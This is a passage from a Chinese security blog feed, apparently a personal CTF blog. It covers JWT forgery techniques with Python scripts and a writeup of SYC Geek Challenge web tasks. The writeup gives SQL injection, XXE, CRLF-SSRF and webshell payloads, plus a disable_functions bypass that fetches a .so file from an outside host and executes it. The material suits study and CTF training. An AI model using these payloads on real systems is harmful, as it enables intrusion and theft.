$Signature</code></pre><p>如何保证安全？</p><ol><li>发送JWT要使用HTTPS；不使用HTTPS发送的时候，JWT里不要写入秘密数据</li><li>JWT的payload中要设置expire时间</li></ol><h2 id="JWT攻击手段"><a href="#JWT攻击手段" class="headerlink" title="JWT攻击手段"></a>JWT攻击手段</h2><h3 id="非对称-gt-对称攻击"><a href="#非对称-gt-对称攻击" class="headerlink" title="非对称-&gt;对称攻击"></a>非对称-&gt;对称攻击</h3><p>HS256算法使用密钥为所有消息进行签名和验证。</p><p>而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。</p><p>如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。</p><p>由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。</p><p>这样的话，后端代码使用RSA公钥+HS256算法进行签名验证</p><p>同样的，可以通过一个例子来理解这种攻击方式 <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p><p>RSA公钥：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a></p><p>该例子解法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line"></span><br><span class="line"># eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9</span><br><span class="line"># &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;&#125;</span><br><span class="line"></span><br><span class="line"># eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNzg3NCwiZXhwIjoxNTA0MDA3OTk0LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span><br><span class="line"># &#123;&quot;iss&quot;:&quot;http:\&#x2F;\&#x2F;demo.sjoerdlangkemper.nl\&#x2F;&quot;,&quot;iat&quot;:1504007874,&quot;exp&quot;:1504007994,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">public &#x3D; open(&#39;public.pem.1&#39;, &#39;r&#39;).read()</span><br><span class="line"></span><br><span class="line">print public</span><br><span class="line"></span><br><span class="line">print jwt.encode(&#123;&quot;data&quot;:&quot;test&quot;&#125;, key&#x3D;public, algorithm&#x3D;&#39;HS256&#39;)  &#x2F;&#x2F;修改payload中的明文信息</span><br></pre></td></tr></table></figure><h3 id="密钥爆破攻击"><a href="#密钥爆破攻击" class="headerlink" title="密钥爆破攻击"></a>密钥爆破攻击</h3><p>因为HS256只有一个密钥，解密加密都是同一个密钥，因此破解比较容易。</p><p>附上现成的破解工具链接<a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><h3 id="修改算法none"><a href="#修改算法none" class="headerlink" title="修改算法none"></a>修改算法none</h3><p>签名算法保证了JWT在传输的过程中不被恶意用户修改</p><p>但是header中的alg字段可被修改为none</p><p>一些JWT库支持none算法，即没有签名算法，当alg为none时后端不会进行签名校验</p><p>将alg修改为none后，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’）然后提交到服务端即可</p><p>这种攻击的例子可以参考：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p><p>代码可以在Github上找到 <a href="https://github.com/Sjord/jwtdemo/">https://github.com/Sjord/jwtdemo/</a></p><p>这个例子的解法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import jwt</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># 原header</span><br><span class="line"># eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br><span class="line"># &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 原payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0</span><br><span class="line"># &#123;&quot;iss&quot;:&quot;http:\&#x2F;\&#x2F;demo.sjoerdlangkemper.nl\&#x2F;&quot;,&quot;iat&quot;:1504006435,&quot;exp&quot;:1504006555,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">def b64urlencode(data):</span><br><span class="line">    return base64.b64encode(data).replace(&#39;+&#39;, &#39;-&#39;).replace(&#39;&#x2F;&#39;, &#39;_&#39;).replace(&#39;&#x3D;&#39;, &#39;&#39;)</span><br><span class="line"></span><br><span class="line"># 构造算法字段为none, payload部分可以随意修改</span><br><span class="line">print b64urlencode(&quot;&#123;\&quot;typ\&quot;:\&quot;JWT\&quot;,\&quot;alg\&quot;:\&quot;none\&quot;&#125;&quot;) + \</span><br><span class="line">    &#39;.&#39; + b64urlencode(&quot;&#123;\&quot;data\&quot;:\&quot;test\&quot;&#125;&quot;) + &#39;.&#39;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SYC极客大挑战writeup</title>
      <link href="2019/11/06/syc-ctf-wp/"/>
      <url>2019/11/06/syc-ctf-wp/</url>
      
        <content type="html"><![CDATA[<p>听学长说这里的题还挺简单的，便过来做了做，总结一下吧！</p><a id="more"></a><h2 id="打比赛之前先撸一只猫！"><a href="#打比赛之前先撸一只猫！" class="headerlink" title="打比赛之前先撸一只猫！"></a>打比赛之前先撸一只猫！</h2><p>查看源代码，发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">    echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get传参就行</p><pre><code>?cat=dogSyc&#123;I_actu4l1y_Lik3_d0gs&#125; </code></pre><h2 id="你看见过我的菜刀么"><a href="#你看见过我的菜刀么" class="headerlink" title="你看见过我的菜刀么"></a>你看见过我的菜刀么</h2><p>打开网页发现    </p><pre><code>eval($_POST[&quot;Syc&quot;]);</code></pre><p>蚁剑直接连就行，发现根目录里有flag文件夹，打开发现flag.txt文件，查看得到flag</p><pre><code>Syc&#123;Upl0ad_f1l3_i5_daNger0us&#125;</code></pre><h2 id="BurpSuiiiiiit"><a href="#BurpSuiiiiiit" class="headerlink" title="BurpSuiiiiiit!!!"></a>BurpSuiiiiiit!!!</h2><p>下载过来是个.jar文件，bp导入即可</p><p><img src="/2019/11/06/syc-ctf-wp/20191108193033.png"></p><p>在Errors可以看到flag</p><pre><code>Syc&#123;BurpExtender_Are_guns_F0r_Hack3rs&#125;</code></pre><h2 id="性感潇文清，在线算卦"><a href="#性感潇文清，在线算卦" class="headerlink" title="性感潇文清，在线算卦"></a>性感潇文清，在线算卦</h2><p>查看源代码发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$savepath &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;&#x2F;&quot;;</span><br><span class="line">if (!is_dir($savepath)) &#123;</span><br><span class="line">    $oldmask &#x3D; umask(0);</span><br><span class="line">    mkdir($savepath);</span><br><span class="line">    umask($oldmask);</span><br><span class="line">&#125;</span><br><span class="line">if ((@$_GET[&#39;u&#39;]) &amp;&amp; (@$_GET[&#39;p&#39;])) &#123;</span><br><span class="line">    $content &#x3D; &#39;***************&#39;;</span><br><span class="line">    file_put_contents(&quot;$savepath&quot; . sha1($_GET[&#39;u&#39;]), $content);</span><br><span class="line">    $msg &#x3D; &#39;Ding!你的算卦结果就在这儿啦！ &#39; . $savepath . htmlspecialchars(sha1($_GET[&#39;u&#39;])) . &quot;&quot;;</span><br><span class="line">    echo $msg;</span><br><span class="line">    usleep(100000);</span><br><span class="line">    @$content &#x3D; &quot;you are too slow&quot;;</span><br><span class="line">    file_put_contents(&quot;$savepath&quot; . sha1($_GET[&#39;u&#39;]), $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示用条件竞争</p><p>这段代码的意思就是根据你的ip，对其sha1加密，并创建这个文件夹。</p><p>然后GET方式接收两个参数，将传过来的u进行sha1加密，并创建该文件，里面写如$content（目测flag)，然后程序睡眠100000微秒，一微秒等于百万分之一秒，大概是0.1s，看到这就用竞争了</p><p>由于你的ip地址不变，如果请求的u不变的话，那么文件url是固定的</p><p>bp开两个intruder，一个是让它生成文件，一个访问文件</p><p><img src="/2019/11/06/syc-ctf-wp/20191108195656.png"></p><pre><code>Syc&#123;You-4re-S0-f4st&#125;</code></pre><h2 id="Easysql"><a href="#Easysql" class="headerlink" title="Easysql"></a>Easysql</h2><p>这题是多次试出来的</p><p>先在用户名加个<code>&#39;</code></p><p>发现报错信息</p><p><img src="/2019/11/06/syc-ctf-wp/20191109215357.png"></p><p>分析一下报错信息，猜测后台sql语句为<code>&#39;$username&#39;</code></p><p>payload:</p><pre><code>用户名处： admin&#39; or 1#Syc&#123;sqL_inj3cti0n_1s_re4lly_fUn&#125;</code></pre><h2 id="RCE-me"><a href="#RCE-me" class="headerlink" title="RCE me"></a>RCE me</h2><p>这道题考察的是无字母数字绕过 + disable_fuction绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">        $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">            if(strlen($code)&gt;40)&#123;</span><br><span class="line">                    die(&quot;This is too Long.&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">            if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">                    die(&quot;NO.&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">            @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ?&gt;</span><br></pre></td></tr></table></figure><p>这道题可能看着很熟悉，可以看下我这篇博客<a href="http://www.moonback.xyz/2019/10/16/nowords-webshell/">http://www.moonback.xyz/2019/10/16/nowords-webshell/</a></p><p>但这道题并不是那种思路</p><p>先看下phpinfo吧</p><pre><code>http://114.116.44.23:40001/?code=$_=%22%23./|&#123;%22^%22|~`//%22;$&#123;$_&#125;[_]();POST    _=phpinfo</code></pre><p>或者直接用<strong>异或</strong>或者<strong>取反</strong>构造也行，并且发现好像只能传POST两个参数</p><p>看一下目录，发现有flag文件和readflag，猜测flag是直接读不了的，必须运行readflag才能</p><p><img src="/2019/11/06/syc-ctf-wp/20191106162901.png"></p><p>发现能执行系统命令的函数基本都过滤了</p><p><img src="/2019/11/06/syc-ctf-wp/20191106153907.png"></p><p>这里就用<code>LD_PRELOAD</code>来绕过了</p><pre><code>?code=$_=$&#123;~%A0%AF%B0%AC%AB&#125;[_];$_($&#123;~%A0%AF%B0%AC%AB&#125;[__]);</code></pre><p>利用这个payload，<code>_</code>传<code>assert</code>(不知道为啥eval不行),<code>__</code>传恶意代码</p><p><strong>第一步</strong>，先往服务器上传一个<code>.so</code>共享库文件，可以放在/tmp目录下因，为这个路径默认权限是777，可以使用</p><pre><code>file_put_contents(&quot;/tmp/bypass_disablefunc_x64.so&quot;,file_get_contents(&quot;http://****/bypass_disablefunc_x64.so&quot;))</code></pre><p>或者用copy函数</p><pre><code>copy(&quot;http://******/bypass_disablefunc_x64.so&quot;,&quot;/tmp/bypass_disablefunc_x64.so&quot;)</code></pre><p><strong>第二步</strong>，向/tmp目录下写入一个php文件</p><pre><code>file_put_contents(&quot;/tmp/moonback&quot;,&quot;&lt;?php putenv(&#39;EVIL_CMDLINE=&#39;.&#39;cd /%26%26./readflag &gt; /tmp/moonback1 2&gt;%261&#39;);putenv(&#39;LD_PRELOAD=&#39;.&#39;/tmp/bypass_disablefunc_x64.so&#39;);mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;);?&gt;&quot;);</code></pre><p>其内容写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">putenv(&#39;EVIL_CMDLINE&#x3D;&#39;.&#39;cd &#x2F;%26%26.&#x2F;readflag &gt; &#x2F;tmp&#x2F;moonback1 2&gt;%261&#39;);&#x2F;&#x2F;EVIL_CMDLINE&#x3D;shell命令，并将结果输出到一个文件</span><br><span class="line">putenv(&#39;LD_PRELOAD&#x3D;&#39;.&#39;&#x2F;tmp&#x2F;bypass_disablefunc_x64.so&#39;);&#x2F;&#x2F;LD_PRELOAD&#x3D;动态加载库的位置</span><br><span class="line">mail(&#39;&#39;, &#39;&#39;, &#39;&#39;, &#39;&#39;);&#x2F;&#x2F;用mail函数触发</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个内容的<code>&amp;</code>符号要url编码%26</p><p><strong>第三步</strong>，包含文件，查看输出结果</p><pre><code>include(&#39;/tmp/moonback&#39;)var_dump(file_get_contents(&#39;/tmp/moonback1&#39;))</code></pre><p>成功解题</p><h2 id="李三的代码审计笔记第一页"><a href="#李三的代码审计笔记第一页" class="headerlink" title="李三的代码审计笔记第一页"></a>李三的代码审计笔记第一页</h2><p>这题并没有神魔漏洞，只需在自己服务器上每次访问让它返回不一样的东西就行</p><p>可以用flask简单搭一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">importflask </span><br><span class="line">importdatetime</span><br><span class="line">server&#x3D;flask.Flask(__name__) </span><br><span class="line">data&#x3D;&quot;If I knewwhere Iwould die, I would never go there.&quot; </span><br><span class="line">data&#x3D;data.split(&quot;&quot;) </span><br><span class="line">data.reverse()</span><br><span class="line">server.route(&#39;&#x2F;&#39;,methods&#x3D;[&#39;post&#39;,&#39;get&#39;]) </span><br><span class="line">defindex():</span><br><span class="line">returndata.pop()</span><br><span class="line">server.run(port&#x3D;9999)</span><br></pre></td></tr></table></figure><h2 id="服务端检测系统"><a href="#服务端检测系统" class="headerlink" title="服务端检测系统"></a>服务端检测系统</h2><p>访问题目，查看源码，发现<code>admin.php</code>，访问显示127.0.0.1才能访问，说明admin.php需要<code>index.php</code> ssrf</p><p>在源码发现这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    if(isset($_POST[&#39;method&#39;]) &amp;&amp; isset($_POST[&#39;url&#39;]) )&#123;</span><br><span class="line">        $method&#x3D;$_POST[&#39;method&#39;];</span><br><span class="line">        $url&#x3D;$_POST[&#39;url&#39;];</span><br><span class="line"></span><br><span class="line">        if(preg_match(&#39;&#x2F;^http:\&#x2F;\&#x2F;&#x2F;i&#39;,$url))&#123;</span><br><span class="line">            $opts &#x3D; array(</span><br><span class="line">                &#39;http&#39;&#x3D;&gt;array(</span><br><span class="line">                    &#39;method&#39;&#x3D;&gt;$method,</span><br><span class="line">                    &#39;timeout&#39;&#x3D;&gt;3</span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            $context &#x3D; stream_context_create($opts);</span><br><span class="line">            $body &#x3D; @file_get_contents($url.&quot;&#x2F;anything&quot;, false, $context);</span><br><span class="line"></span><br><span class="line">            if(isset($http_response_header))&#123;</span><br><span class="line">                preg_match(&quot;&#x2F;Allow:(.*?);&#x2F;i&quot;,implode(&#39;;&#39;,$http_response_header).&quot;;&quot;,$matches);</span><br><span class="line">                if(isset($matches[1]))&#123;</span><br><span class="line">                    echo &quot;服务端支持的请求方法有:&quot;.$matches[1];</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo &quot;failed&lt;br&gt;&quot;;</span><br><span class="line">                    echo sprintf(&quot;body length of $method%d&quot;, $body);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;error&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#39;not allowed&#39;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>method和url可控，url必须是<code>http://</code>开头</p><p>输入的url会拼接上<code>/anything</code>然后以options请求方法访问，一次得到Allow返回头</p><p>不过<code>sprintf(&quot;body    length    of    $method%d&quot;,    $body);</code>这句代码有错误 </p><p>因为格式化字符串<code>&quot;body    length    of    $method%d&quot;</code>可控，所以只要把%d给转义掉，再注入%s，就能让其显示$body内容，</p><p>例如$method传入<code>%s%</code>，那么最后拼接成的便是<code>body length of %s%%d</code>，而最后显示的效果就是<code>body length    of 返回的数据%d</code></p><p><img src="/2019/11/06/syc-ctf-wp/20191117215230.png"></p><p>再通过ssrf POST一个<code>iwantflag=yes</code>，但是怎末POST呢？</p><p>发现这里用的是<code>file_get_context_create()</code>函数来发起HTTP请求，一些配置选项包括这里的请求方式是作为一个数组经过<code>stream_context_create()</code>处理后传入的。其实这里就存在<code>CRLF注入漏洞</code>，即我们可以完全自己构造一个完整的POST包发出去</p><p>具体如下：</p><p><img src="/2019/11/06/syc-ctf-wp/20191117220802.png"></p><p><code>iwantflag=yes%26b=%s%</code>中的<code>%26</code>是&amp;的url编码，这里是必须要编码的，否则就被当做当前面请求包的参数分割符了</p><p>还有为什么这里多传了一个b参数，因为观察最终的请求包就知道后面是会被拼接上原本正 常的HTTP请求包中的内容的，所以为了防止干扰iwantflag变量就又加一个变量</p><p>由于我们是要得到返回的数据的，所以最后依然是<code>%s%</code></p><p>请求头中的<code>Content-Length</code>也很重要，和请求包数据实际长度不符是不会得到正确回应的， 所以实际中要自己估量</p><h2 id="Lovelysql"><a href="#Lovelysql" class="headerlink" title="Lovelysql"></a>Lovelysql</h2><p>这题其实是考察联合查询，将请求信息保存成文件，用sqlmap跑下就出来了</p><pre><code>Syc&#123;Ohhh_y0u_foUnd_m3&#125;</code></pre><p>不url编码会报错</p><p><img src="/2019/11/06/syc-ctf-wp/TIM%E6%88%AA%E5%9B%BE20200503113348.png"></p><p>order by判断为3列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>order%<span class="number">20</span>by%<span class="number">204</span>%<span class="number">23</span>&amp;password=adsdas</span><br></pre></td></tr></table></figure><p>判断回显列为2，3列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span>&amp;password=adsdas</span><br></pre></td></tr></table></figure><p>报数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(schema_name),<span class="number">3</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.schemata%<span class="number">23</span>&amp;password=adsdas</span><br><span class="line"><span class="comment"># information_schema,test,performance_schema,mysql,geek</span></span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(table_name),<span class="number">3</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span>where%<span class="number">20</span>table_schema=<span class="string">&quot;geek&quot;</span>%<span class="number">23</span>&amp;password=adsdas</span><br><span class="line"><span class="comment"># geekuser,l0ve1ysq1</span></span><br></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(column_name),<span class="number">3</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=<span class="string">&quot;geek&quot;</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>table_name=<span class="string">&quot;l0ve1ysq1&quot;</span>%<span class="number">23</span>&amp;password=adsdas</span><br><span class="line"><span class="comment"># id,username,password</span></span><br></pre></td></tr></table></figure><p>爆内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=a%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(id,<span class="number">0x23</span>,username,<span class="number">0x23</span>,password),<span class="number">3</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>geek.l0ve1ysq1%<span class="number">23</span>&amp;password=adsdas</span><br><span class="line"><span class="comment"># 成功爆出flag</span></span><br></pre></td></tr></table></figure><h2 id="性感黄阿姨，在线聊天"><a href="#性感黄阿姨，在线聊天" class="headerlink" title="性感黄阿姨，在线聊天"></a>性感黄阿姨，在线聊天</h2><p>发送flag，抓包看到</p><p><img src="/2019/11/06/syc-ctf-wp/20191115230427.png"></p><p>将guest改成admin发现</p><p><img src="/2019/11/06/syc-ctf-wp/20191115230615.png"></p><p>给了个提示，<code>name=md5($flag)</code>，这里就用到弱类型了，即数字和字符串比较时，字符串会先转换成数字，猜测$flag加密后前几位是数字，bp爆破，爆破的内容为name</p><p><img src="/2019/11/06/syc-ctf-wp/20191115231212.png"></p><p>发现为<code>paload=357</code>时，有个提示</p><p><img src="/2019/11/06/syc-ctf-wp/20191115231741.png"></p><p>访问发现神魔都没有，并且提示里让我们读这个文件，况且题目考察的点有xxe</p><p>再返回那个POST请求，之前提交的是json格式的，那是否能提交xml格式的那？</p><p><img src="/2019/11/06/syc-ctf-wp/20191115232948.png"></p><p>发现能回显的地方是name，读取/etc/passwd成功，那么就读一下flag</p><p>但是会发现直接读<code>f14g_Is_Here.php</code>读不出来，这是因为php文件中有特殊字符(如&lt;)让xml解 析时出错了,可以利用php流读取，base64解密就行</p><p><img src="/2019/11/06/syc-ctf-wp/20191115234743.png"></p><h2 id="李三的代码审计笔记第二页"><a href="#李三的代码审计笔记第二页" class="headerlink" title="李三的代码审计笔记第二页"></a>李三的代码审计笔记第二页</h2><h2 id="Babysql"><a href="#Babysql" class="headerlink" title="Babysql"></a>Babysql</h2><p>这题双写绕过就行，发现对<code>union,select,for,form</code>都替换成空了</p><p><strong>爆数据库</strong></p><pre><code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117200927.png"></p><p><strong>爆表</strong></p><pre><code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117201208.png"></p><p><strong>爆字段</strong></p><pre><code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=&#39;geek&#39; anandd table_name=&#39;b4bsql&#39;%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117202116.png"></p><p><strong>爆内容</strong></p><pre><code>?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(id,0x23,username,0x23,passwoorrd) frfromom geek.b4bsql%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117202552.png"></p><h2 id="神秘的三叶草"><a href="#神秘的三叶草" class="headerlink" title="神秘的三叶草"></a>神秘的三叶草</h2><p>这道题其实很简单，怪当时没看仔细</p><p>查看源代码，发现<code>Secret.php</code></p><p>改下<code>User-Agent</code>，<code>Referer</code>，<code>X-Forwarded-For</code>就行，注意bp抓包改的时候要有个空格，并且是英文输入法下的空格</p><pre><code>Syc&#123;We1com3_t0_Syc_S3creT&#125;</code></pre><h2 id="Eval-evil-code"><a href="#Eval-evil-code" class="headerlink" title="Eval evil code"></a>Eval evil code</h2><p>这道题感觉很好，考察的是<strong>php无参数执行命令</strong></p><p>就是用无参数的php函数去执行命令，之前没了解过，这次就学学吧</p><p>可以看下我这篇博客</p><p>验证码部分，可以直接脚本跑出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(1, 10000001):</span><br><span class="line">    s &#x3D; hashlib.md5(str(i).encode()).hexdigest()[0:4]</span><br><span class="line">    #s &#x3D; hashlib.sha1(str(i)).hexdigest()[:6]</span><br><span class="line">    if s &#x3D;&#x3D; &quot;978e&quot;:</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>先传个phpinfo看看，发现</p><p><img src="/2019/11/06/syc-ctf-wp/20191112205429.png"></p><p>这里就用Headers的方法</p><pre><code>eval(end(getallheaders()));</code></pre><p>获取headers的最后一个执行（注意在http请求头的函数是可以有参数的）</p><p><img src="/2019/11/06/syc-ctf-wp/20191115224848.png"></p><p><img src="/2019/11/06/syc-ctf-wp/20191115225514.png"></p><p>读取<code>theflag.php</code>内容即可</p><h2 id="Jiang‘s-Secret"><a href="#Jiang‘s-Secret" class="headerlink" title="Jiang‘s Secret"></a>Jiang‘s Secret</h2><p>查看源码，发现有个<code>Archive_room.php</code>，访问点击secret提示查阅结束，抓包看下发现有个人<code>action.php</code>，发送到repeater,go一下发现<code>secr3t.php</code> ,访问发现代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span 